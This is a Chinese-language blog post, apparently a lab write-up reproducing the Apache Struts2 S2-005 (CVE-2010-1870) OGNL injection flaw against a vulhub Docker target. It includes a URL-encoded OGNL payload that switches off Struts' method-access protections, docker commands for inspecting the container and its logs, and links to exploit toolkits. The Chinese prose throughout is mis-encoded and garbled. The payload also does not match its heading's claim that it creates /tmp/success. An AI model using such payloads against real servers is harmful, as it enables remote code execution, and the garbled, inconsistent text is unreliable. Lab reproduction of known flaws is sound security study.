# CVE-2010-1870 S2-005 å¤ç° - ç¾å¼åŠ ç³– - åšå®¢å›­

> åŸæ–‡ï¼š[`www.cnblogs.com/peace-and-romance/p/15626196.html`](https://www.cnblogs.com/peace-and-romance/p/15626196.html)

### 0X00-å¼•è¨€

* * *

æ±Ÿå—çœŸæ˜¯ä¸ªå¥½åœ°æ–¹ï¼Œå……æ»¡è¯—æƒ…ç”»æ„ï¼Œå¸¸è§äºæ–‡äººå¢¨å®¢çš„ä¹¦è¯ä¸­ï¼Œæ¯æ¬¡è§åˆ°éƒ½å¿ä¸ä½å¿ƒç¥å‘å¾€ã€‚æƒ³åˆ°çƒŸé›¨å°±æƒ³åˆ°æ±Ÿå—ï¼Œæ±Ÿå—é£æ™¯ç¾ï¼Œäººæ›´ç¾ã€‚

å—æœå››ç™¾å…«åå¯ºï¼Œå¤šå°‘æ¥¼å°çƒŸé›¨ä¸­ã€‚

æ±Ÿå—åˆæ¢¦çƒŸé›¨ï¼Œé•¿æ²³æµå…¥æ•…é‡Œã€‚

æ±Ÿå—å¥½ï¼Œæœ€å¥½æ˜¯çº¢è¡£ã€‚

### 0X01-ç¯å¢ƒæ­å»º

* * *

é¶æœºï¼šCentOS Linux 7

æ”»å‡»æœºï¼šwindows server 2016 && Kail

ç¯å¢ƒï¼švulhub

é¡¹ç›®åœ°å€ï¼š[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

æ­å»º vulhub è¯·è®¿é—®ï¼š[ç©ºç™½ centos7 64 æ­å»º vulhub(è¯¦ç»†)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-æ¼æ´æè¿°

* * *

å‚è€ƒå´ç¿°æ¸…çš„ã€Šç™½å¸½å­ Web å®‰å…¨ã€‹ä¸€ä¹¦

> s2-0005 æ¼æ´çš„èµ·æºèµ·æº S2-003ï¼ˆç‰ˆæœ¬ï¼šStruts 2.0.12ï¼‰ï¼Œstruts2 æ‰§è¡Œ http çš„æ¯ä¸ªå‚æ•°åè§£æä¸º OGNL è¯­å¥ï¼ˆå¯ç†è§£ä¸º java ä»£ç ï¼‰ã€‚OGNL è¡¨è¾¾å¼é€šè¿‡#æ¥è®¿é—® struts çš„å¯¹è±¡ï¼Œstruts æ¡†æ¶é€šè¿‡è¿‡æ»¤#å­—ç¬¦é˜²æŠ¤å®‰å…¨é—®é¢˜ï¼Œä½†é€šè¿‡ unicode ç¼–ç (\u0023)æˆ– 8 è¿›åˆ¶(\43)å³ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œå¯¹äº S2-003 æ¼æ´ï¼Œå®˜æ–¹é€šè¿‡å¢åŠ å®‰å…¨é™åˆ¶é…ç½®ï¼ˆç¦æ­¢ä½¿ç”¨æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•ç­‰ï¼‰æ¥æ–‡æ¡£ï¼Œä½†æ˜¯å®‰å…¨é…ç½®è¢«å†æ¬¡å¯¼è‡´äº†æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ OGNL è¡¨è¾¾å¼å°†è¿™ 2 ä¸ªé€‰é¡¹æ‰“å¼€ï¼ŒS2-003 çš„æŒ‰é’®æŠŠè‡ªå·±æ‰“å¼€ä¸€ä¸ªé”ï¼Œä½†æ˜¯æŠŠé”é’¥åŒ™ç»™æ’åœ¨äº†é”å¤´ä¸Š

XWork åˆ©ç”¨å·´è¥¿ GET å‚æ•°çš„é”®å’Œå€¼ OGNL è¡¨è¾¾å¼è§£ææˆ Java è¯­å¥ï¼Œå¦‚ï¼š

```
user.address.city=Bishkek&user['favoriteDrink']=kumys 
//ä¼šè¢«è½¬åŒ–æˆ
action.getUser().getAddress().setCity("Bishkek")  
action.getUser().setFavoriteDrink("kumys") 
```

è§¦å‘æ¼æ´åˆ©ç”¨äº†è¿™ä¸ªç‚¹ï¼Œå†é…åˆ OGNL çš„æ²™ç›’-ç»•è¿‡æ–¹æ³•ï¼Œç»„æˆäº† S2003ã€‚å®˜æ–¹å¯¹ 003 çš„ä¿®å¤æ–¹æ³•æ˜¯å¢åŠ äº†å®‰å…¨æ¨¡å¼ï¼ˆæ²™ï¼‰ï¼ŒS2-005 åœ¨ OGNL è¡¨è¾¾å¼ä¸­å°†å®‰å…¨æ¨¡å¼å…³é—­ï¼Œåˆç»•è¿‡äº†ä¿®å¤æ–¹æ³•ã€‚æ•´ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š

*   S2-003 ä½¿ç”¨`\u0023`ç»•è¿‡ 2 å¯¹`#`çš„é˜²å¾¡
*   S2-003 åå®˜æ–¹å¢åŠ äº†å®‰å…¨æ¨¡å¼ï¼ˆæ²™ç›’ï¼‰
*   S2-005 ä½¿ç”¨ OGNL è¡¨è¾¾å¼å°†æ²™ç›’å…³é—­ï¼Œç»§ç»­æ‰§è¡Œä»£ç 

å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.1.8.1

### 0X03-æ¼æ´å¤ç°

* * *

##### 01-åˆ›å»º tmp/success

payload:

```
(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf) 
```

![image-20211130203723982](img/fb4ecac66bdd52b95b62f8ad23a050c8.png)

æŸ¥çœ‹å®¹å™¨å†… tmp ç›®å½•

```
docker ps #æŸ¥çœ‹å®¹å™¨ ID
docker exec -it ID /bin/bash #è¿›å…¥å®¹å™¨
ls /tmp  #æŸ¥çœ‹å®¹å™¨å†… tmp ç›®å½•
exit  #é€€å‡ºå®¹å™¨ 
```

![image-20211130204043122](img/b6118efd549a890e5e577d78615a9d23.png)

è‡³äºæ„å»ºå…¶ä»– payloadï¼Œå°ç”Ÿåšä¸åˆ°å•ŠğŸ™ƒ

### 0X04-å·¥å…·æ£€æµ‹

* * *

å·¥å…·åœ°å€ï¼š[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

æ­¤å·¥å…·å¼ºå¾—å¾ˆï¼Œè°ç”¨è°çŸ¥é“ï¼Œæ‡‚éƒ½æ‡‚

![image-20211130204635381](img/ec5592d510ee13db743f0989fd1cefd7.png)

![image-20211130204731979](img/8694b75c0ea6155350a5bd3c8b5d0982.png)

### 0X05-æ—¥å¿—æŸ¥çœ‹

* * *

```
docker ps  #æŸ¥çœ‹å®¹å™¨ ID
docker exec -it 910e341b0e88 /bin/bash #è¿›å…¥
cat localhost_access_log.2021-12-01.txt  #æŸ¥çœ‹æ—¥å¿—
exit #é€€å‡ºå®¹å™¨ 
```

![image-20211130205310220](img/ab3966b42f78c996ddc2b6df756c425f.png)

### 0X06-å‚è€ƒæ–‡ç« 

å¤§ä½¬çš„ç™¾å®ç®±ï¼š[`github.com/k8gege/K8tools`](https://github.com/k8gege/K8tools)

[S2-005 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´](https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md)